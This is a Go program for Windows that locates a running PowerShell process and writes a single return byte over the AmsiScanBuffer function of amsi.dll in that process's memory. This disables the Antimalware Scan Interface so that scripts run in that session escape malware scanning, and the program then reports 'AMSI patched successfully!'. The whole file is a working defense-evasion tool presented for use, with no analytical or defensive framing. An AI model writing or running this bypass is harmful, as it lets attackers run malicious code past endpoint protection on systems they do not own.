package main

import (
	"fmt"
	"syscall"
	"unsafe"
	"strings"
	"os"

	"golang.org/x/sys/windows"
)

func findPowerShellPID() (uint32, error) {
	// Call the Windows API to list running processes
	var snapshot windows.Handle
	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	// Take a snapshot of all processes
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("failed to take process snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	// Iterate over all processes to find PowerShell
	err = windows.Process32First(snapshot, &procEntry)
	if err != nil {
		return 0, fmt.Errorf("failed to get first process: %v", err)
	}

	for {
		if strings.Contains(syscall.UTF16ToString(procEntry.ExeFile[:]), "powershell") {
			return procEntry.ProcessID, nil
		}
		err = windows.Process32Next(snapshot, &procEntry)
		if err != nil {
			break
		}
	}
	return 0, fmt.Errorf("PowerShell process not found")
}

func main() {
	pid, err := findPowerShellPID()
	if err != nil {
		fmt.Println("Error finding PowerShell PID:", err)
		return
	}
	fmt.Printf("Found PowerShell PID: %d\n", pid)

	// Load the amsi.dll library
	amsiDLL, err := syscall.LoadLibrary("amsi.dll")
	if err != nil {
		fmt.Println("Error loading amsi.dll:", err)
		return
	}
	defer syscall.FreeLibrary(amsiDLL)

	// Get the address of the AmsiScanBuffer function
	amsiScanBufferAddr, err := syscall.GetProcAddress(amsiDLL, "AmsiScanBuffer")
	if err != nil {
		fmt.Println("Error getting AmsiScanBuffer address:", err)
		return
	}

	// Use unsafe.Pointer to handle raw memory addresses for patching
	amsiScanBufferPtr := unsafe.Pointer(uintptr(amsiScanBufferAddr))

	// Prepare the patch
	patch := []byte{0xC3}

	processHandle, err := windows.OpenProcess(
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION,
		false,
		pid,
	)
	if err != nil {
		fmt.Println("Error opening target process:", err)
		return
	}
	defer windows.CloseHandle(processHandle)

	var bytesWritten uintptr
	err = windows.WriteProcessMemory(
		processHandle,
		uintptr(amsiScanBufferPtr), // Casting unsafe.Pointer to uintptr
		&patch[0],
		uintptr(len(patch)),
		&bytesWritten,
	)
	if err != nil {
		fmt.Println("Error patching AmsiScanBuffer:", err)
		return
	}
	fmt.Println("AMSI patched successfully!")
}
